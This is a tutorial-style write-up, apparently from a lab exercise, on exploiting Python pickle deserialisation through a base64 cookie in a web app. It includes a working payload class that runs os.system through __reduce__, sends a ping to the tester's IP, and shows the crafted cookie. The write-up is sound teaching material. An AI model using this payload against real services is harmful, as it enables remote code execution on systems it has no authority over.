# Deserialising Python

## Overview
When enumerating web applications, sometimes you can run into objects that are being serialised by a python service that is running in the back end, this is sometimes related to when the web service is running using flask or werkzeug but can be related to many types of web service.

## Identifying Serialised Data
I noticed that when I was enumerating the search bar of a webpage for vulnerabilities that it was returning a cookie with a base64 value:
    search_cookie="gASVDgAAAAAAAACMCnNlYXJjaFRlc3SULg=="; Path=/

When I decoded this from base64, it gave me a value of "............searchTest.." where searchTest was the string that I entered to test the processing of the search bar. 

This excess "...." indicates the use of python's pickle module to serialize objects. I wrote a python script to test this.

    import pickle
    import base64

    serial = b"gASVDgAAAAAAAACMCnNlYXJjaFRlc3SULg=="
    decoded_serial = base64.b64decode(serial)
    deserialised = pickle.loads(decoded_serial)
    print(deserialised)

This gave me an output of "searchTest" when run- exactly my output. 

Now that we know that the data from this input box is being processed by the backend- let's reverse this process so that we can craft a cookie that will result in trying to execute some code. How can we do this? Let's work backwards:

What did we do to decode the serialized data:
1. Decoded from base64
2. Deserialised the object with pickle
3. Viewed the object that had been input as data 

Therefore, we need to do the opposite- with a few extra steps to encapsulate the command we choose.

We need to:
1. Choose a command to run
2. Create a system call from python containing this command 
2. Encapsulate this in a python object that we can serialise, with pickle 
3. Serialise it
4. Convert the serialised value to base64- to match the format of the original cookie 

I did this using the following code:

    import pickle
    import base64
    import os

    class command:
      def __reduce__(self):
        command = ('ping -c 10 10.11.18.40')
        return os.system, (command,)

    value = command()
    serialised = pickle.dumps(value)
    cookie = base64.b64encode(serialised)
    print(cookie)

This follows the logic outlined above and returns us: b'gASVMQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBZwaW5nIC1jIDEwIDEwLjExLjE4LjQwlIWUUpQu'

We can validate that this method is correct by running it through our deserialise python script. This does indeed end up running the "ping" command the local machine.

We can then change this cookie and check for an icmp from the target machine using tcpdump

sudo tcpdump -i tun0 icmp

